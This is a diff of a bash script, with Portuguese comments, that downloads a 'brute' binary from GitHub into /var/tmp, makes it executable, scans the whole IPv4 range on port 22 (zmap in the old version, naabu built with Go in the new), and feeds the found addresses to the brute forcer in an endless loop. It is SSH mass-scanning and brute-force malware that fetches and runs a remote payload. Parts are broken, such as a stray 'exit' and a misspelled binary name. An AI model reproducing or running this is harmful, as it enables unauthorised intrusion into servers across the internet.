@@ -2,22 +2,30 @@
 
 
 brute_url='https://github.com/atilabyte/golang/raw/refs/heads/master/brute'
-url_zmap='https://github.com/zmap/zmap/archive/refs/tags/v4.4.0.zip'
+go='https://go.dev/dl/go1.26.5.linux-amd64.tar.gz'
+naabu='https://github.com/projectdiscovery/naabu/archive/refs/tags/v2.6.1.tar.gz'
 
 
 
 
 brute(){
 
-cd /var/tmp  ; cd .brute
+
+cd /var/tmp/go/bin ; cd  *.1/cmd/naabu
+
 
 wget $brute_url  -O brute || curl  -L $brute_url -o brute
 
-chmod 777 brute && chmod 777 zmap
 
-timeout   120s ./zmap  -p 22   0.0.0.0/0  > ips  #120 segundos para  pega os ips
+chmod 777 brute && chmod 777 nabu
 
-timeout   120s    ./brute  #120  segundos para  testa o   ip
+
+exit
+
+
+timeout   5s ./nabu  -p 22   0.0.0.0/0  > ips  #120 segundos para  pega os ips
+ 
+#timeout   120s    ./brute  #120  segundos para  testa o   ip
 
 return
 
@@ -31,49 +39,61 @@ install_zmap(){
 
 #function no critical
 
-cd /var/tmp 
 
-out_cat=$(cat .brute/zmap )  #troca  cat por ls
+out_cat=$(ls  /var/tmp/go/bin/naabu-2.6.1/cmd/naabu) 
 
-if (( ! $?  )) ; then 
+if (( ! $?  )) ; then # is 0 ?
 
-echo "zmap instaled ok"
+echo "nabu  instaled ok"
+
 
 brute
 
 return
 
+
 fi ; 
 
-#####################################
+
+
+#--------------------------------------------------------------
+
+
 
 if [ $EUID -eq  0 ] ; then
 
 
-apt-get   update -y  &&  apt-get  upgrade  -y   
+#apt-get   update -y  &&  apt-get  upgrade  -y   
 
-apt-get  install  -y  unzip  ; apt-get install -y make
-
-apt-get install -y  gcc  || apt-get install -y cc
-
-apt-get install -y  build-essential  ; apt-get install -y cmake
-
-apt-get install -y   libgmp3-dev gengetopt libpcap-dev flex byacc libjson-c-dev pkg-config libunistring-dev libjudy-dev
+#apt-get install -y  libpcap-dev 
 
 
 
 cd /var/tmp 
 
 
+wget $go  -O  go.gz  || curl  -L  $go  -o   go.gz
 
-wget $url_zmap  -O  zmap.zip  || curl  -L  $url_zmap  -o   zmap.zip #dowload zipedd   zmap
+tar -xf  go.gz ||  tar -xf *.gz 
 
 
-unzip  zmap.zip ; cd zmap-4.4.0  ;  cmake .  ;  make
- 
-mkdir -p  /var/tmp/.brute
+cd go  ; cd bin 
 
-cd src ; cp zmap /var/tmp/.brute/zmap
+
+wget  $naabu  -O naabu.gz  || curl -L $naabu -o naabu.gz
+
+tar -xf  *.gz
+
+cd *.1 ; cd cmd/naabu 
+
+mv main.go nabu.go
+
+
+../../.././go  build nabu.go
+
+
+
+
 
 
 
@@ -97,7 +117,7 @@ while true ; do
 
 install_zmap
  
-sleep   5
+sleep   1
 
 done
 
